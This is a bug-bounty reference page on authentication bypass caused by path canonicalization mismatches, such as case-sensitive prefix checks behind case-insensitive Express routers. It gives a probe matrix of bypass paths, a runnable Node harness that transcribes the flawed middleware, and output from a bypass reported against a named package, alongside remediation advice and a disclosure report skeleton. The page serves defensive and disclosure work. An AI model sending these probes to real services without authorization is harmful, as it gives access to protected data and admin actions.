# Path Canonicalization Auth Bypass

Companion to the "Canonicalization Mismatch" section of `hunt-auth-bypass/SKILL.md`.
The guard inspects the request path as a **string**; the router resolves it as a **route**.
When those disagree, the guard does not fire and the route still serves.

Confirmed live on 2026-10-08 against `@relay-settlement/indexer` (Express 4.19.2) — see §5 for the
verbatim code and §6 for the report skeleton.

---

## 1. Why this class is easy to miss

The code *looks* protective and passes review:

```javascript
export const createApiKeyMiddleware = (expectedApiKey, options = {}) => {
  const headerName = options.headerName ?? "x-api-key"
  const pathPrefix = options.pathPrefix ?? "/api/"

  return (req, res, next) => {
    if (!req.path.startsWith(pathPrefix)) {
      return next()                          // <-- the branch that skips auth
    }
    if (isApiKeyAuthorized(req.headers[headerName], expectedApiKey)) {
      return next()
    }
    return res.status(401).json({ error: "Unauthorized" })
  }
}
```

The `401` branch is correct and is what a reviewer reads. The `next()` above it is the bypass —
and it is reached on **every** path that does not literally begin with `/api/`, which includes
every case-varied and normalisation-differing form of a path that the router *will* serve.

Two independent facts combine; either alone is harmless:

1. the prefix comparison is **case-sensitive** (`String.prototype.startsWith`);
2. the framework's router is **case-insensitive by default**.

---

## 2. Framework defaults that create the mismatch

| Stack | Default that bites | Notes |
|---|---|---|
| **Express 4 / 5** | `caseSensitive: false` | `app.set("case sensitive routing", true)` to change; `strict routing` off by default so `/api` and `/api/` co-match |
| **Fastify** | `caseSensitive: false` by default | `routerOptions: { caseSensitive: true }` |
| **Koa / koa-router** | depends on router; `@koa/router` defaults case-**sensitive** | verify per router package, do not assume |
| **Django** | `APPEND_SLASH` + `CommonMiddleware` normalises trailing slash *after* middleware | middleware `request.path` may differ from the resolved view |
| **ASP.NET Core** | routing is case-**insensitive**; middleware `Request.Path` preserves case | same shape as Express |
| **Spring MVC** | `useTrailingSlashMatch` / path matching options | path patterns normalised differently from a `Filter`'s raw URI |
| **nginx in front** | `location` matching + `X-Original-URL` / `X-Rewrite-URL` / `X-Forwarded-Prefix` | a proxy that rewrites the prefix makes the guard's view and the app's view diverge |
| **Any CDN / edge** | normalises `//`, `..`, `%2e`, Unicode | normalisation may happen *upstream of* the app, so only the app sees the cleaned form |

**Read the version the project pins**, not the one you remember. The behaviour of the default is
the whole finding.

---

## 3. Probe matrix

Send each row, unauthenticated, and compare against the two controls.

| # | Path | Expect | Meaning if it serves |
|---|---|---|---|
| C1 | `/api/tokens` | `401` | control — guard works when the prefix matches |
| C2 | `/api/tokens` + valid key | `200` | control — guard allows the legitimate caller |
| 1 | `/API/tokens` | `401` | case folding |
| 2 | `/Api/Tokens` | `401` | case folding (mixed) |
| 3 | `/api` | `401` | missing trailing slash vs a `/api/` prefix |
| 4 | `/api//tokens` | `401` | duplicate slash |
| 5 | `/api/../api/tokens` | `401` | dot-segment traversal (guard matched, router normalised) |
| 6 | `/%61pi/tokens` | `401` | percent-encoded character |
| 7 | `/api%2ftokens` | `401` | encoded separator |
| 8 | `/api;foo/tokens` | `401` | path-parameter stripping |
| 9 | `/api/tokens/../admin` | `401` | trailing traversal |
| 10 | `/api/tokens` + `X-Original-URL: /api/admin/x` | `401` | proxy override honoured |

Repeat against **every** privileged route family you found (admin, internal, export, replay) —
a single normalisation bug usually defeats all the guards built the same way.

---

## 4. Repro harness (Node / Express)

Pin the framework version the project declares, transcribe the middleware **verbatim**, and assert
on observable status codes. Two controls minimum, or the finding is arguable.

```javascript
const express = require("express")
const { timingSafeEqual } = require("node:crypto")
const SECRET = "known-key-for-the-test"

// ---- transcribed verbatim from the target's auth module -----------------
const safeEqual = (l, r) => {
  const a = Buffer.from(l, "utf8"), b = Buffer.from(r, "utf8")
  return a.length === b.length && timingSafeEqual(a, b)
}
const isApiKeyAuthorized = (provided, expected) => {
  if (!expected) return true                       // fail-open: note this too
  if (Array.isArray(provided)) return provided.some(v => safeEqual(v, expected))
  if (typeof provided !== "string") return false
  return safeEqual(provided, expected)
}
const createApiKeyMiddleware = (expectedApiKey, options = {}) => {
  const headerName = options.headerName ?? "x-api-key"
  const pathPrefix = options.pathPrefix ?? "/api/"
  return (req, res, next) => {
    if (!req.path.startsWith(pathPrefix)) return next()
    if (isApiKeyAuthorized(req.headers[headerName], expectedApiKey)) return next()
    return res.status(401).json({ error: "Unauthorized" })
  }
}
// -------------------------------------------------------------------------

const app = express()
let adminRan = 0, dataServed = 0

// mirrors the target: a second guard for the admin family, same defect
app.post("/api/admin/replay/transfers",
  createApiKeyMiddleware(SECRET, { pathPrefix: "/api/admin/" }),
  (_req, res) => { adminRan++; res.status(202).json({ ran: true }) })

app.use(createApiKeyMiddleware(SECRET))           // blanket guard
app.get("/api/tokens", (_req, res) => { dataServed++; res.json({ data: ["internal"] }) })

const server = app.listen(0, async () => {
  const base = `http://127.0.0.1:${server.address().port}`
  const cases = [
    ["GET",  "/api/tokens",                    {},     "CONTROL no key  -> must be 401"],
    ["GET",  "/api/tokens",                    {k:1},  "CONTROL with key-> must be 200"],
    ["GET",  "/API/tokens",                    {},     "case fold"],
    ["GET",  "/Api/Tokens",                    {},     "case fold mixed"],
    ["GET",  "/api//tokens",                   {},     "duplicate slash"],
    ["GET",  "/api/../api/tokens",             {},     "dot traversal"],
    ["POST", "/API/admin/replay/transfers",    {},     "ADMIN without key"],
  ]
  for (const [method, path, h, label] of cases) {
    const res = await fetch(base + path, {
      method,
      headers: { "content-type": "application/json", ...(h.k ? { "x-api-key": SECRET } : {}) },
      body: method === "POST" ? "{}" : undefined,
    })
    console.log(`${String(res.status).padEnd(4)} ${method.padEnd(5)} ${path.padEnd(34)} | ${label}`)
  }
  console.log(`\nadmin handler ran ${adminRan}x without a key; protected data served ${dataServed}x`)
  server.close()
})
```

Assert on **both** directions: the control must 401/200 as labelled, and the bypass rows must not
be `401`. A run where the control also fails proves nothing about the target — it proves your
harness is wrong. (Hit exactly that trap in this session: the first table showed "NOT AFFECTED"
for a deployment already proven vulnerable, because the verdict mapping was inverted. Re-read the
assertion direction before trusting any summary table you generate.)

---

## 5. The confirmed case (2026-10-08)

`@relay-settlement/indexer` — Express 4.19.2, `packages/indexer/src/auth.ts` +
`src/server.ts`.

```
401  GET   /api/tokens                    no key    <- CONTROL blocked correctly
200  GET   /api/tokens                    with key  <- CONTROL allowed correctly
200  GET   /API/tokens                    no key    <- bypass
200  GET   /Api/Tokens                    no key    <- bypass
200  GET   /API/BALANCES/0xdead           no key    <- bypass
202  POST  /API/admin/replay/transfers    no key    <- ADMIN bypass
202  POST  /Api/Admin/Replay/Transfers    no key    <- ADMIN bypass

admin handler executed 2x WITHOUT an API key
protected data served 3x WITHOUT an API key
```

Posture check that made it a real finding rather than an intended-open API:

- `src/index.ts:24-33` logs *"API requested but disabled because auth is not set"* and
  *"API auth is disabled by explicit configuration"* — the design **intends** auth;
- `src/config.ts:95` — `resolveEnableApi = requested && (Boolean(authApiKey) || allowUnauthenticatedApi)`;
- `.env.example` — `AUTH_API_KEY=` (to be filled), `ALLOW_UNAUTHENTICATED_API=0`, `ENABLE_API=0`.

So in the intended configuration the key is a real boundary, and the case-fold removes it.

**Honest limit recorded in the report:** no externally reachable deployment was found (common
indexer hostnames probed; `api.relay.link` is a different service). The finding therefore shipped
as a source-review defect with the external path explicitly marked unproven — not as a live
exploit. Every probe was a read-only `GET`; the admin route was never called on a live host.

---

## 6. Report skeleton

```
Title: API key check is bypassed by case-folding the path
Severity: High (auth bypass reaching an admin action) — reduce if internal-only

1. Summary        -- one capital letter removes auth from the whole surface
2. Root cause     -- quote the guard's `startsWith` AND the framework default side by side
3. Reproduction   -- the control pair FIRST, then the bypass rows
4. Impact         -- enumerate the routes reached; state plainly what you are NOT claiming
5. Honest limits  -- was an external deployment proven? Say no if you could not prove it
6. Remediation    -- normalise the comparison AND mount the guard on the router
7. References     -- CWE-178 (Improper Handling of Case Sensitivity), CWE-287
```

Two things that decide whether this gets paid rather than bounced:

- **Lead with the controls.** A reviewer's first instinct is "you set the key wrong". The pair
  `401 without / 200 with` on the same lowercase path kills that objection in two lines.
- **Do not imply reach you did not prove.** If the service is internal, say so. Programs commonly
  pay only where an **unprivileged party can reach the bug** — an overclaimed external path gets
  the whole report distrusted, an honest limit gets it triaged fairly.

---

## 7. Related classes in this library

- **`hunt-auth-bypass` → Function-Level Access Control** — the sibling-route sibling of this bug:
  the guard exists but was never attached. Here the guard is attached and skipped; there it is
  absent. Same hunt, different mechanism.
- **`hunt-waf-bypass` / origin-level WAF patterns** — normalisation differences between edge and
  origin are the traversal and proxy-header rows of §3 at network scale.
- **`hunt-cors`** — origin comparison has the identical canonicalization problem (case, trailing
  dot, `null`, subdomain wildcards); the control-pair method transfers directly.
